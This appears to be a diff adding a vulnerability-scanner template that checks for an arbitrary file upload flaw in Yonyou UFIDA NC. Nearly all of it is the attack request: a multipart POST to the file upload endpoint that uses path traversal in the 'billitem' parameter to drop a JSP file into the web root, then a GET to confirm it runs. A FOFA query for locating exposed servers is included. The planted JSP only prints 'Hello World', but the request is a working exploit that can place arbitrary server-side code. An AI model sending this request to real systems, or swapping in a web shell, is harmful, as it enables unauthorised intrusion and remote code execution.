@@ -1,0 +1,38 @@
+id: yongyou-NC-FileManager-fileupload
+
+info:
+  tags: yongyou-NC-FileManager-fileupload
+  name: yongyou-NC-FileManager-fileupload
+  author: xc
+  severity: high
+  description: yongyou-NC-FileManager-fileupload
+  metadata:
+    fofa-qeury: app="用友-UFIDA-NC"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305
+        
+        --d0b7a0d40eed0e32904c8017b09eb305
+        Content-Disposition: form-data; name="file"; filename="te1st.jsp" 
+        Content-Type: text/plain
+
+        <%out.print("Hello World");%>
+        --d0b7a0d40eed0e32904c8017b09eb305--
+
+      - |
+        GET /te1st.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200'
+          - 'contains(body_2,"Hello World")'
+        condition: and
